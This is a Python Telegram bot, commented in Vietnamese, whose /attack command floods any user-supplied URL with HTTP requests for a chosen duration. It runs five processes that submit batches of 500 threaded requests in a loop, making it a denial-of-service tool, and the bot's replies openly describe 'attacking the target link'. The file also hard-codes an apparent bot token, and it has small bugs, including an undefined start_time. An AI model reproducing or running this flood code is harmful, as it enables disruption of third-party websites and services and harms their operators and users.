import telebot
import requests
import time
import psutil
import datetime
import multiprocessing
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore

# Khởi tạo colorama
init(autoreset=True)

# Token của bot Telegram
TOKEN = "7667637653:AAFPm8zpxwqSSFEt6k2iT7rDjcMosZz_1HE"
bot = telebot.TeleBot(TOKEN)

# Hàm gửi một yêu cầu HTTP
def send_request(url):
    try:
        response = requests.get(url, timeout=2)
        print(Fore.GREEN + f"Trạng thái {response.status_code}")
    except requests.RequestException as e:
        print(Fore.RED + f"Lỗi - {str(e)}")

# Hàm gửi yêu cầu HTTP theo nhóm
def send_batch_requests(url, batch_size):
    with ThreadPoolExecutor(max_workers=batch_size) as executor:
        for _ in range(batch_size):
            executor.submit(send_request, url)

# Hàm chính gửi yêu cầu HTTP liên tục trong thời gian quy định
def send_requests_with_time_limit(url, duration):
    start_time = time.time()
    batch_size = 500
    
    with multiprocessing.Pool(processes=5) as pool:  # Giới hạn tiến trình là 5 để tránh quá tải
        while time.time() - start_time < duration:
            pool.apply_async(send_batch_requests, (url, batch_size))
    
    print(Fore.YELLOW + f"Hoàn thành gửi yêu cầu tới {url} trong {duration} giây.")

# Lệnh /start để chào mừng người dùng
@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "Chào mừng!\nUse the /attack command to start the attack..")

# Lệnh /free để gửi yêu cầu HTTP theo URL và thời gian người dùng yêu cầu
@bot.message_handler(commands=['attack'])
def free(message):
    try:
        # Tách tin nhắn thành các phần tử
        args = message.text.split()
        if len(args) < 3:
            bot.reply_to(message, "Please provide URL and time.\nFor example: /free http://example.com 60")
            return
        
        url = args[1]
        duration = int(args[2])
        
        bot.reply_to(message, f"⚔️Attacking the target link⚔️\n↣Link: {url}\n↣Time: {duration} giây...")
        
        # Gửi yêu cầu HTTP
        send_requests_with_time_limit(url, duration)
        
        bot.reply_to(message, f"Complete attack\nLink: {url}\nTime: {duration} giây.")
    except ValueError:
        bot.reply_to(message, "Thời gian phải là một số nguyên dương. Vui lòng thử lại.")

@bot.message_handler(commands=['time'])
def show_uptime(message):
   
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'{hours} giờ, {minutes} phút, {seconds} giây'
    bot.reply_to(message, f'Bot Đã Hoạt Động Được: {uptime_str}')
    

@bot.message_handler(commands=['cpu'])
def check_cpu(message):
 # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    # Tiếp tục xử lý lệnh cpu ở đây
    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent

    bot.reply_to(message, f'🖥️ CPU Usage: {cpu_usage}%\n💾 Memory Usage: {memory_usage}%')


# Khởi động bot
bot.infinity_polling(timeout=60, long_polling_timeout = 1)